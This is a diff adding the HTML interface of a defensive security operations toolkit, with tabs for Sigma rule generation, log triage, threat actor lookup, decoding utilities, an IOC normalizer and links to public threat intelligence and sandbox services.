+              <option value="windows_powershell">Windows PowerShell</option>
+              <option value="windows_sysmon">Sysmon</option>
+              <option value="proxy">Web Proxy</option>
+              <option value="firewall">Firewall</option>
+              <option value="linux_auditd">Linux auditd</option>
+            </select>
+            <input id="sigma-ioc" class="aw-input" type="text" placeholder="Key IOC / detection value (e.g. -EncodedCommand, powershell.exe)" />
+            <input id="sigma-mitre" class="aw-input" type="text" placeholder="MITRE TTP(s) (e.g. T1059.001, T1027)" />
+            <select id="sigma-level" class="aw-input">
+              <option value="critical">critical</option>
+              <option value="high" selected>high</option>
+              <option value="medium">medium</option>
+              <option value="low">low</option>
+            </select>
+          </div>
+          <div class="tools" style="margin-top:10px;">
+            <button id="sigma-gen-btn" type="button">⚡ Generate Sigma</button>
+            <button id="sigma-copy-btn" type="button">📋 Copy</button>
+            <button id="sigma-uncoder-btn" type="button">🔗 Open Uncoder.io</button>
+            <button id="sigma-clear-btn" type="button">🗑 Clear</button>
+          </div>
+          <pre id="sigma-output" class="rule-output" style="display:none"></pre>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== LOG TRIAGE TAB ===== -->
+    <div id="tab-logtriage" class="tab-panel">
+      <div class="input-panel">
+        <div class="bulk-header">
+          <h3>🧾 Log / Alert Auto-Triage</h3>
+          <p class="sub">Paste a raw SIEM alert, Windows Event Log block, firewall log, or any security log. The tool parses it, extracts all IOCs, identifies event types, and pre-fills the Alert Write-up form.</p>
+        </div>
+        <textarea id="lt-input" spellcheck="false" placeholder="Paste raw SIEM alert, Windows Event Log, firewall log, email header, or any security event here...&#10;&#10;Examples:&#10;  EventID: 4688 — A new process has been created...&#10;  SRC=192.168.1.5 DST=10.0.0.1 PROTO=TCP DPT=443...&#10;  Authentication-Results: spf=fail; dkim=pass..."></textarea>
+        <div class="tools" style="margin-top:10px;">
+          <button id="lt-analyze-btn" type="button">🔍 Auto-Triage</button>
+          <button id="lt-prefill-btn" type="button">📝 Pre-fill Write-up</button>
+          <button id="lt-copy-btn" type="button">📋 Copy Results</button>
+          <button id="lt-clear-btn" type="button">🗑 Clear</button>
+        </div>
+        <div id="lt-status" class="status" style="margin-top:10px;">
+          <span>Paste a log or alert above and click Auto-Triage</span><span class="badge">TRIAGE</span>
+        </div>
+      </div>
+      <div id="lt-results" class="sa-results"></div>
+    </div>
+
+    <!-- ===== THREAT ACTOR TAB ===== -->
+    <div id="tab-threat" class="tab-panel">
+      <div class="input-panel">
+        <div class="bulk-header">
+          <h3>🕵 Threat Actor / Campaign Lookup</h3>
+          <p class="sub">Search by actor name (APT29, Lazarus, etc.) or campaign keyword. Get MITRE ATT&amp;CK group page, known TTPs, tools used, and external intelligence pivot links.</p>
+        </div>
+        <div class="input-row">
+          <input id="ta-input" type="text" class="aw-input" placeholder="Actor name, alias, or campaign (e.g. APT29, Lazarus, Cozy Bear, FIN7)" style="flex:1" />
+          <button id="ta-search-btn" type="button">🔍 Search</button>
+        </div>
+        <div id="ta-status" class="status" style="margin-top:10px;">
+          <span>Enter an actor or campaign name above</span><span class="badge">THREAT INTEL</span>
+        </div>
+      </div>
+      <div id="ta-results" class="ta-results"></div>
+    </div>
+
+    <!-- ===== CUSTOM TOOLS TAB ===== -->
+    <div id="tab-custom" class="tab-panel">
+      <div class="input-panel">
+        <div class="bulk-header">
+          <h3>⚙ Custom Tool Slot Builder</h3>
+          <p class="sub">Add your own org-internal tools, SIEM dashboards, or ticketing systems. Use <code>{IOC}</code> as a placeholder for the search value.</p>
+        </div>
+        <div class="custom-tool-form">
+          <input id="ct-name" class="aw-input" type="text" placeholder="Tool name (e.g. Internal SIEM)" />
+          <input id="ct-icon" class="aw-input" type="text" placeholder="Emoji icon (e.g. 🏢)" style="max-width:90px" />
+          <select id="ct-type" class="aw-input" style="max-width:130px">
+            <option value="all">All IOC types</option>
+            <option value="ip">IP only</option>
+            <option value="domain">Domain only</option>
+            <option value="hash">Hash only</option>
+            <option value="url">URL only</option>
+            <option value="email">Email only</option>
+          </select>
+          <input id="ct-url" class="aw-input" type="text" placeholder="URL template — use {IOC} as placeholder (e.g. https://siem.corp/search?q={IOC})" style="flex:2" />
+          <button id="ct-add-btn" type="button">➕ Add Tool</button>
+        </div>
+        <div id="ct-status" class="status" style="margin-top:10px;">
+          <span>Add custom tools above — they appear in Single IOC search results</span><span class="badge">CUSTOM</span>
+        </div>
+      </div>
+      <div id="ct-list" class="ct-list"></div>
+    </div>
+
+    <!-- ===== SOC UTILITIES TAB ===== -->
+    <div id="tab-utils" class="tab-panel">
+      <div class="utils-grid">
+
+        <!-- Quick Base64 Encode/Decode -->
+        <div class="utils-card">
+          <div class="utils-card-head">🔓 Quick Base64 Decode / Encode</div>
+          <textarea id="util-b64-input" spellcheck="false" placeholder="Paste Base64 to decode, or plain text to encode..."></textarea>
+          <div class="utils-actions">
+            <button id="util-b64-decode" type="button">🔓 Decode</button>
+            <button id="util-b64-encode" type="button">🔒 Encode</button>
+            <button id="util-b64-deep" type="button" title="Recursively decode multiple layers">🔁 Deep Decode</button>
+            <button id="util-b64-copy" type="button">📋 Copy</button>
+            <button id="util-b64-pivot" type="button" title="Send decoded result to Single IOC search">🔍 Pivot</button>
+          </div>
+          <textarea id="util-b64-output" spellcheck="false" readonly placeholder="Result..."></textarea>
+        </div>
+
+        <!-- URL Decoder / Encoder -->
+        <div class="utils-card">
+          <div class="utils-card-head">🔗 URL Decode / Encode</div>
+          <textarea id="util-url-input" spellcheck="false" placeholder="Paste URL-encoded string or plain text..."></textarea>
+          <div class="utils-actions">
+            <button id="util-url-decode" type="button">🔓 URL Decode</button>
+            <button id="util-url-encode" type="button">🔒 URL Encode</button>
+            <button id="util-url-double-decode" type="button">🔁 Double Decode</button>
+            <button id="util-url-copy" type="button">📋 Copy</button>
+          </div>
+          <textarea id="util-url-output" spellcheck="false" readonly placeholder="Result..."></textarea>
+        </div>
+
+        <!-- Regex IOC Hunter -->
+        <div class="utils-card utils-card-wide">
+          <div class="utils-card-head">🎯 Regex IOC Hunter</div>
+          <div class="regex-hunter-layout">
+            <div class="regex-hunter-left">
+              <textarea id="util-regex-input" spellcheck="false" placeholder="Paste any text — threat report, alert, email body, log..."></textarea>
+              <div class="utils-actions">
+                <button id="util-regex-run" type="button">🔍 Extract All IOCs</button>
+                <button id="util-regex-copy" type="button">📋 Copy IOCs</button>
+                <button id="util-regex-clear" type="button">🗑 Clear</button>
+                <button id="util-regex-bulk" type="button">📋 Send to Bulk Analyzer</button>
+              </div>
+            </div>
+            <div id="util-regex-results" class="regex-results"></div>
+          </div>
+        </div>
+
+        <!-- IOC Normalizer / Defang Detector -->
+        <div class="utils-card">
+          <div class="utils-card-head">🧹 IOC Normalizer</div>
+          <p class="utils-card-desc">Normalizes any defanged/mixed IOC: strips hxxp, [.], (@), brackets, trailing punctuation. One IOC per line.</p>
+          <textarea id="util-norm-input" spellcheck="false" placeholder="hxxps://evil[.]com&#10;192[.]168[.]1[.]1&#10;user[@]domain.com&#10;44d88612fea8a8f36de82e1278abb02f"></textarea>
+          <div class="utils-actions">
+            <button id="util-norm-run" type="button">🧹 Normalize</button>
+            <button id="util-norm-copy" type="button">📋 Copy</button>
+            <button id="util-norm-pivot" type="button">📤 Send to Bulk</button>
+            <button id="util-norm-clear" type="button">🗑 Clear</button>
+          </div>
+          <textarea id="util-norm-output" spellcheck="false" readonly placeholder="Normalized output..."></textarea>
+        </div>
+
+        <!-- Hex / Octal Decoder -->
+        <div class="utils-card">
+          <div class="utils-card-head">🔢 Hex / Octal / Char Decoder</div>
+          <textarea id="util-hex-input" spellcheck="false" placeholder="Examples:&#10;\x68\x65\x6c\x6c\x6f&#10;0x48 0x65 0x6c&#10;72 101 108&#10;\150\145\154"></textarea>
+          <div class="utils-actions">
+            <button id="util-hex-decode-hex" type="button">HEX → Text</button>
+            <button id="util-hex-decode-oct" type="button">OCT → Text</button>
+            <button id="util-hex-decode-dec" type="button">DEC → Text</button>
+            <button id="util-hex-copy" type="button">📋 Copy</button>
+          </div>
+          <textarea id="util-hex-output" spellcheck="false" readonly placeholder="Decoded text..."></textarea>
+        </div>
+
+        <!-- Epoch / Timestamp Converter -->
+        <div class="utils-card">
+          <div class="utils-card-head">⏱ Timestamp Converter</div>
+          <p class="utils-card-desc">Convert Unix epoch ↔ human-readable date. Supports seconds, milliseconds, and ISO 8601.</p>
+          <input id="util-ts-input" class="aw-input" type="text" placeholder="e.g. 1714000000 or 2024-04-25T00:00:00Z" />
+          <div class="utils-actions" style="margin-top:8px">
+            <button id="util-ts-todate" type="button">🕒 Epoch → Date</button>
+            <button id="util-ts-toepoch" type="button">🔢 Date → Epoch</button>
+            <button id="util-ts-now" type="button">📍 Now</button>
+            <button id="util-ts-copy" type="button">📋 Copy</button>
+          </div>
+          <div id="util-ts-output" class="utils-output-box"></div>
+        </div>
+
+        <!-- Hash Calculator (text input) -->
+        <div class="utils-card">
+          <div class="utils-card-head">🔑 Text Hasher</div>
+          <p class="utils-card-desc">Hash any text string (useful for indicator comparison, password checks, or signature generation).</p>
+          <textarea id="util-hash-input" spellcheck="false" placeholder="Enter text to hash..." rows="3"></textarea>
+          <div class="utils-actions">
+            <button id="util-hash-run" type="button">⚡ Hash It</button>
+            <button id="util-hash-copy" type="button">📋 Copy SHA256</button>
+            <button id="util-hash-pivot" type="button">🔍 Pivot SHA256</button>
+          </div>
+          <div id="util-hash-output" class="utils-output-box"></div>
+        </div>
+
+        <!-- Analyst Scratchpad -->
+        <div class="utils-card utils-card-wide">
+          <div class="utils-card-head">📝 Analyst Scratchpad <span style="font-size:10px;color:var(--muted);font-weight:400;margin-left:8px">— auto-saved to browser storage</span></div>
+          <textarea id="util-notes" spellcheck="false" placeholder="Use this as a working notepad during investigations. Notes auto-save every keystroke...&#10;&#10;Tip: Use <!-- CASE-001 --> markers to organize findings."></textarea>
+          <div class="utils-actions">
+            <button id="util-notes-copy" type="button">📋 Copy Notes</button>
+            <button id="util-notes-export" type="button">📤 Export .txt</button>
+            <button id="util-notes-clear" type="button">🗑 Clear Notes</button>
+          </div>
+          <div class="utils-note-count"><span id="util-notes-chars">0</span> chars · <span id="util-notes-words">0</span> words</div>
+        </div>
+
+        <!-- String Reverse / ROT13 / Caesar -->
+        <div class="utils-card">
+          <div class="utils-card-head">🔄 String Transforms</div>
+          <textarea id="util-str-input" spellcheck="false" placeholder="Enter text to transform..."></textarea>
+          <div class="utils-actions">
+            <button id="util-str-reverse" type="button">↩ Reverse</button>
+            <button id="util-str-rot13" type="button">🔄 ROT13</button>
+            <button id="util-str-upper" type="button">▲ Upper</button>
+            <button id="util-str-lower" type="button">▼ Lower</button>
+            <button id="util-str-hex" type="button">HEX</button>
+            <button id="util-str-copy" type="button">📋 Copy</button>
+          </div>
+          <textarea id="util-str-output" spellcheck="false" readonly placeholder="Result..."></textarea>
+        </div>
+
+        <!-- JWT Decoder -->
+        <div class="utils-card">
+          <div class="utils-card-head">🪙 JWT Decoder</div>
+          <p class="utils-card-desc">Decode a JWT token (header + payload). Validates structure only — does not verify signature.</p>
+          <textarea id="util-jwt-input" spellcheck="false" placeholder="Paste JWT token: eyJhbGc..." rows="3"></textarea>
+          <div class="utils-actions">
+            <button id="util-jwt-decode" type="button">🔓 Decode JWT</button>
+            <button id="util-jwt-copy" type="button">📋 Copy</button>
+          </div>
+          <pre id="util-jwt-output" class="utils-output-box" style="white-space:pre-wrap;word-break:break-all;font-size:11px;"></pre>
+        </div>
+
+        <!-- Whois quick reference -->
+        <div class="utils-card">
+          <div class="utils-card-head">📡 Quick Pivot Launcher</div>
+          <p class="utils-card-desc">Daily-use intelligence links. Opens in a new tab — no IOC needed.</p>
+          <div class="quicklinks-grid">
+            <a href="https://www.virustotal.com/" target="_blank" class="quicklink-btn">🧪 VirusTotal</a>
+            <a href="https://urlscan.io/" target="_blank" class="quicklink-btn">🔎 URLScan</a>
+            <a href="https://bazaar.abuse.ch/" target="_blank" class="quicklink-btn">🦠 MalwareBazaar</a>
+            <a href="https://threatfox.abuse.ch/" target="_blank" class="quicklink-btn">🦊 ThreatFox</a>
+            <a href="https://any.run/" target="_blank" class="quicklink-btn">🏃 AnyRun</a>
+            <a href="https://www.hybrid-analysis.com/" target="_blank" class="quicklink-btn">🧫 Hybrid Analysis</a>
+            <a href="https://attack.mitre.org/" target="_blank" class="quicklink-btn">🧩 ATT&CK</a>
+            <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog" target="_blank" class="quicklink-btn">🧨 CISA KEV</a>
+            <a href="https://otx.alienvault.com/" target="_blank" class="quicklink-btn">👽 OTX</a>
+            <a href="https://viz.greynoise.io/" target="_blank" class="quicklink-btn">🌫 GreyNoise</a>
+            <a href="https://search.censys.io/" target="_blank" class="quicklink-btn">🔭 Censys</a>
+            <a href="https://www.shodan.io/" target="_blank" class="quicklink-btn">🛰 Shodan</a>
+            <a href="https://intelx.io/" target="_blank" class="quicklink-btn">📡 IntelX</a>
+            <a href="https://haveibeenpwned.com/" target="_blank" class="quicklink-btn">🧨 HIBP</a>
+            <a href="https://gchq.github.io/CyberChef/" target="_blank" class="quicklink-btn">🧪 CyberChef</a>
+            <a href="https://uncoder.io/" target="_blank" class="quicklink-btn">⚙️ Uncoder</a>
+            <a href="https://lolbas-project.github.io/" target="_blank" class="quicklink-btn">🧰 LOLBAS</a>
+            <a href="https://gtfobins.github.io/" target="_blank" class="quicklink-btn">🧰 GTFOBins</a>
+          </div>
+        </div>
+
+      </div>
+    </div><!-- end tab-utils -->
+
+    <!-- ===== CTI FEED TAB ===== -->
+    <div id="tab-cti" class="tab-panel">
+      <div class="input-panel">
+        <div class="bulk-header">
+          <h3>🌐 CTI — Cyber Threat Intelligence</h3>
+          <p class="sub">Live threat feeds, actor profiles, campaign tracking, and intelligence sharing. Pull current intel from open sources without leaving the toolkit.</p>
+        </div>
+
+        <!-- CTI sub-tabs -->
+        <div class="cti-subtab-bar">
+          <button class="cti-sub-btn active" data-ctitab="feeds" type="button">📡 Live Feeds</button>
+          <button class="cti-sub-btn" data-ctitab="news" type="button">🗞️ Threat News</button>
+          <button class="cti-sub-btn" data-ctitab="actors" type="button">🕵 Actor Intel</button>
+          <button class="cti-sub-btn" data-ctitab="ioc-check" type="button">🎯 IOC Intel Check</button>
+          <button class="cti-sub-btn" data-ctitab="campaigns" type="button">📊 Campaign Tracker</button>
+          <button class="cti-sub-btn" data-ctitab="resources" type="button">📚 Intel Resources</button>
+        </div>
+      </div>
+
+      <!-- FEEDS PANEL -->
+      <div id="cti-panel-feeds" class="cti-panel active">
+        <div class="cti-feed-controls">
+          <button id="cti-feeds-refresh" type="button">🔄 Refresh All Feeds</button>
+          <span id="cti-feed-status" class="cti-feed-status">Click Refresh to load latest threat intelligence</span>
+        </div>
+        <div class="cti-feeds-grid" id="cti-feeds-grid">
+          <!-- Feed cards injected by JS -->
+        </div>
+      </div>
+
+      <!-- THREAT NEWS PANEL -->
+      <div id="cti-panel-news" class="cti-panel" style="display:none">
+        <div class="cti-news-header">
+          <div class="cti-news-header-left">
+            <span class="cti-news-title">🗞️ Threat Intelligence News</span>
+            <span class="cti-news-subtitle">AI-summarized cybersecurity headlines from open sources</span>
+          </div>
+          <div class="cti-news-controls">
+            <select id="cti-news-topic" class="cti-news-select">
+              <option value="latest">🌐 Latest Threats</option>
+              <option value="ransomware">🔒 Ransomware</option>
+              <option value="apt">🕵️ APT / Nation-State</option>
+              <option value="vulnerability">🔓 Vulnerabilities & CVEs</option>
+              <option value="phishing">🎣 Phishing & BEC</option>
+              <option value="malware">🦠 Malware Families</option>
+              <option value="cloud">☁️ Cloud Security</option>
+              <option value="cisa">🧨 CISA Advisories</option>
+            </select>
+            <button id="cti-news-refresh" class="cti-news-btn" type="button">⚡ Get Latest</button>
+          </div>
+        </div>
+        <div id="cti-news-status" class="cti-news-status" style="display:none"></div>
+        <div id="cti-news-results" class="cti-news-results">
+          <div class="cti-news-empty">
+            <div class="cti-news-empty-icon">🗞️</div>
+            <div class="cti-news-empty-text">Click <strong>Get Latest</strong> to pull real-time threat intelligence news</div>
+            <div class="cti-news-empty-sub">Summaries are AI-generated from current cybersecurity sources</div>
+          </div>
+        </div>
+        <div class="cti-news-footer">
+          <span class="cti-news-footer-note">⚠️ AI-generated summaries. Always verify with primary sources before acting. Last updated: <span id="cti-news-timestamp">—</span></span>
+          <div class="cti-news-sources">
+            <a href="https://www.cisa.gov/news-events/cybersecurity-advisories" target="_blank" class="cti-news-src-link">CISA</a>
+            <a href="https://www.bleepingcomputer.com" target="_blank" class="cti-news-src-link">BleepingComputer</a>
+            <a href="https://krebsonsecurity.com" target="_blank" class="cti-news-src-link">KrebsOnSecurity</a>
+            <a href="https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/" target="_blank" class="cti-news-src-link">MSTIC</a>
+            <a href="https://unit42.paloaltonetworks.com" target="_blank" class="cti-news-src-link">Unit 42</a>
+            <a href="https://therecord.media" target="_blank" class="cti-news-src-link">The Record</a>
+          </div>
+        </div>
+      </div>
+
+      <!-- ACTOR INTEL PANEL -->
+      <div id="cti-panel-actors" class="cti-panel" style="display:none">
+        <div class="cti-search-row">
+          <input id="cti-actor-input" class="aw-input" type="text" placeholder="Actor name, alias, or group (e.g. APT29, Lazarus, FIN7, Scattered Spider)" />
+          <button id="cti-actor-search-btn" type="button">🔍 Search</button>
+          <button id="cti-actor-random" type="button" title="Show a random known threat actor">🎲 Random Actor</button>
+        </div>
+        <div id="cti-actor-results" class="cti-actor-results"></div>
+      </div>
+
+      <!-- IOC INTEL CHECK PANEL -->
+      <div id="cti-panel-ioc-check" class="cti-panel" style="display:none">
+        <div class="cti-ioc-check-layout">
+          <div class="cti-ioc-check-left">
+            <p class="utils-card-desc">Check any IOC against open-source CTI databases. Enter one IOC then click Check — results show known threat context, associated campaigns, and related indicators.</p>
+            <div class="cti-search-row">
+              <input id="cti-ioc-input" class="aw-input" type="text" placeholder="IP, domain, hash, URL, email, CVE..." style="flex:1" />
+              <button id="cti-ioc-check-btn" type="button">🎯 Check Intel</button>
+            </div>
+            <div id="cti-ioc-status" class="status" style="margin-top:8px;">
+              <span>Enter an IOC above to check threat context</span><span class="badge">CTI</span>
+            </div>
+          </div>
+        </div>
+        <div id="cti-ioc-results" class="cti-ioc-results"></div>
+      </div>
+
+      <!-- CAMPAIGNS PANEL -->
+      <div id="cti-panel-campaigns" class="cti-panel" style="display:none">
+        <div class="cti-campaigns-header">
+          <h4>📊 Active Campaign Tracker</h4>
+          <p class="utils-card-desc">Track ongoing campaigns and associate IOCs from your investigations. Add entries manually or import from triage results.</p>
+          <div class="cti-search-row">
+            <input id="cti-camp-name" class="aw-input" type="text" placeholder="Campaign name (e.g. Operation ShadowBroker, INC-2025-042)" />
+            <input id="cti-camp-actor" class="aw-input" type="text" placeholder="Attributed actor (optional)" style="max-width:200px" />
+            <select id="cti-camp-status" class="aw-input" style="max-width:140px">
+              <option value="active">🔴 Active</option>
+              <option value="monitoring">🟡 Monitoring</option>
+              <option value="closed">🟢 Closed</option>
+            </select>
+            <button id="cti-camp-add" type="button">➕ Add Campaign</button>
+          </div>
+        </div>
+        <div id="cti-campaigns-list" class="cti-campaigns-list"></div>
+        <div class="cti-camp-actions">
+          <button id="cti-camp-export" type="button">📤 Export Campaigns</button>
+          <button id="cti-camp-clear" type="button">🗑 Clear All</button>
+        </div>
+      </div>
+
+      <!-- RESOURCES PANEL -->
+      <div id="cti-panel-resources" class="cti-panel" style="display:none">
+        <div class="cti-resources-grid">
+
+          <div class="cti-res-section">
+            <div class="cti-res-head">📡 Open Threat Intelligence Platforms</div>
+            <div class="quicklinks-grid">
+              <a href="https://otx.alienvault.com/" target="_blank" class="quicklink-btn">👽 OTX AlienVault</a>
+              <a href="https://threatfox.abuse.ch/" target="_blank" class="quicklink-btn">🦊 ThreatFox</a>
+              <a href="https://bazaar.abuse.ch/" target="_blank" class="quicklink-btn">🦠 MalwareBazaar</a>
+              <a href="https://urlhaus.abuse.ch/" target="_blank" class="quicklink-btn">🏚 URLhaus</a>
+              <a href="https://feodotracker.abuse.ch/" target="_blank" class="quicklink-btn">🎣 FeodoTracker</a>
+              <a href="https://sslbl.abuse.ch/" target="_blank" class="quicklink-btn">🔐 SSL Blacklist</a>
+              <a href="https://pulsedive.com/" target="_blank" class="quicklink-btn">📡 Pulsedive</a>
+              <a href="https://intelx.io/" target="_blank" class="quicklink-btn">📡 IntelX</a>
+              <a href="https://www.virustotal.com/gui/home/search" target="_blank" class="quicklink-btn">🧪 VirusTotal</a>
+              <a href="https://viz.greynoise.io/" target="_blank" class="quicklink-btn">🌫 GreyNoise</a>
+              <a href="https://www.shodan.io/" target="_blank" class="quicklink-btn">🛰 Shodan</a>
+              <a href="https://search.censys.io/" target="_blank" class="quicklink-btn">🔭 Censys</a>
+            </div>
+          </div>
+
+          <div class="cti-res-section">
+            <div class="cti-res-head">🧩 MITRE & Framework Resources</div>
+            <div class="quicklinks-grid">
+              <a href="https://attack.mitre.org/" target="_blank" class="quicklink-btn">🧩 ATT&CK Enterprise</a>
+              <a href="https://attack.mitre.org/software/" target="_blank" class="quicklink-btn">🛠 ATT&CK Software</a>
+              <a href="https://attack.mitre.org/groups/" target="_blank" class="quicklink-btn">🕵 ATT&CK Groups</a>
+              <a href="https://attack.mitre.org/campaigns/" target="_blank" class="quicklink-btn">📊 ATT&CK Campaigns</a>
+              <a href="https://d3fend.mitre.org/" target="_blank" class="quicklink-btn">🛡 D3FEND</a>
+              <a href="https://car.mitre.org/" target="_blank" class="quicklink-btn">🚗 CAR Analytic Repo</a>
+              <a href="https://mitre-engenuity.org/cybersecurity/center-for-threat-informed-defense/" target="_blank" class="quicklink-btn">🏛 CTID</a>
+              <a href="https://navigator.attack.mitre.org/" target="_blank" class="quicklink-btn">🗺 ATT&CK Navigator</a>
+            </div>
+          </div>
+
+          <div class="cti-res-section">
+            <div class="cti-res-head">📰 Threat Reports & Blogs</div>
+            <div class="quicklinks-grid">
+              <a href="https://www.mandiant.com/resources/blog" target="_blank" class="quicklink-btn">🔥 Mandiant Blog</a>
+              <a href="https://research.checkpoint.com/" target="_blank" class="quicklink-btn">🔬 Check Point Research</a>
+              <a href="https://unit42.paloaltonetworks.com/" target="_blank" class="quicklink-btn">🎯 Unit42</a>
+              <a href="https://talos-intelligence-site.s3.amazonaws.com/production/document_files/files/000/095/591/original/062823_Annual_Report.pdf" target="_blank" class="quicklink-btn">🕵️ Talos Blog</a>
+              <a href="https://blog.malwarebytes.com/threat-intelligence/" target="_blank" class="quicklink-btn">🦠 Malwarebytes TI</a>
+              <a href="https://www.secureworks.com/research" target="_blank" class="quicklink-btn">🔐 Secureworks</a>
+              <a href="https://thedfirreport.com/" target="_blank" class="quicklink-btn">🔍 DFIR Report</a>
+              <a href="https://www.cisa.gov/news-events/cybersecurity-advisories" target="_blank" class="quicklink-btn">🧨 CISA Advisories</a>
+              <a href="https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/" target="_blank" class="quicklink-btn">🪟 MSTIC Blog</a>
+              <a href="https://symantec-enterprise-blogs.security.com/threat-intelligence" target="_blank" class="quicklink-btn">🔵 Symantec TI</a>
+            </div>
+          </div>
+
+          <div class="cti-res-section">
+            <div class="cti-res-head">📦 IOC Feed Subscriptions (Free)</div>
+            <div class="quicklinks-grid">
+              <a href="https://feodotracker.abuse.ch/downloads/ipblocklist.csv" target="_blank" class="quicklink-btn">📥 Feodo IP List</a>
+              <a href="https://urlhaus.abuse.ch/downloads/csv/" target="_blank" class="quicklink-btn">📥 URLhaus CSV</a>
+              <a href="https://bazaar.abuse.ch/export/" target="_blank" class="quicklink-btn">📥 MalwareBazaar Export</a>
+              <a href="https://threatfox-api.abuse.ch/api/v1/" target="_blank" class="quicklink-btn">📥 ThreatFox API</a>
+              <a href="https://rules.emergingthreats.net/open/suricata/rules/" target="_blank" class="quicklink-btn">📥 Emerging Threats Rules</a>
+              <a href="https://github.com/stamparm/ipsum" target="_blank" class="quicklink-btn">📥 ipsum IP Blocklist</a>
+              <a href="https://www.dan.me.uk/torlist/" target="_blank" class="quicklink-btn">📥 TOR Exit Nodes</a>
+              <a href="https://cinsscore.com/list/ci-badguys.txt" target="_blank" class="quicklink-btn">📥 CI BadGuys List</a>
+            </div>
+          </div>
+
+          <div class="cti-res-section">
+            <div class="cti-res-head">🔬 Sandbox & Dynamic Analysis</div>
+            <div class="quicklinks-grid">
+              <a href="https://any.run/" target="_blank" class="quicklink-btn">🏃 AnyRun</a>
+              <a href="https://www.hybrid-analysis.com/" target="_blank" class="quicklink-btn">🧫 Hybrid Analysis</a>
+              <a href="https://www.joesandbox.com/" target="_blank" class="quicklink-btn">🧪 JOE Sandbox</a>
+              <a href="https://tria.ge/" target="_blank" class="quicklink-btn">🧯 Triage</a>
+              <a href="https://analyze.intezer.com/" target="_blank" class="quicklink-btn">🧬 Intezer Analyze</a>
+              <a href="https://cuckoo.cert.ee/" target="_blank" class="quicklink-btn">🐦 Cuckoo (CERT-EE)</a>
+              <a href="https://www.virustotal.com/gui/home/upload" target="_blank" class="quicklink-btn">📤 VT File Upload</a>
+            </div>
+          </div>
+
+          <div class="cti-res-section">
+            <div class="cti-res-head">📜 Detection Engineering</div>
+            <div class="quicklinks-grid">
+              <a href="https://github.com/SigmaHQ/sigma" target="_blank" class="quicklink-btn">⚡ Sigma Rules</a>
+              <a href="https://uncoder.io/" target="_blank" class="quicklink-btn">⚙️ Uncoder.io</a>
+              <a href="https://github.com/elastic/detection-rules" target="_blank" class="quicklink-btn">🔵 Elastic Rules</a>
+              <a href="https://github.com/splunk/security_content" target="_blank" class="quicklink-btn">🔍 Splunk Content</a>
+              <a href="https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries" target="_blank" class="quicklink-btn">🪟 M365D Hunting</a>
+              <a href="https://car.mitre.org/analytics/" target="_blank" class="quicklink-btn">🚗 MITRE CAR</a>
+              <a href="https://tdm.socprime.com/" target="_blank" class="quicklink-btn">🎯 SOC Prime TDM</a>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div><!-- end tab-cti -->
+
+  </div><!-- end main -->
+
+  <script src="script.js"></script>
+</body>
+</html>
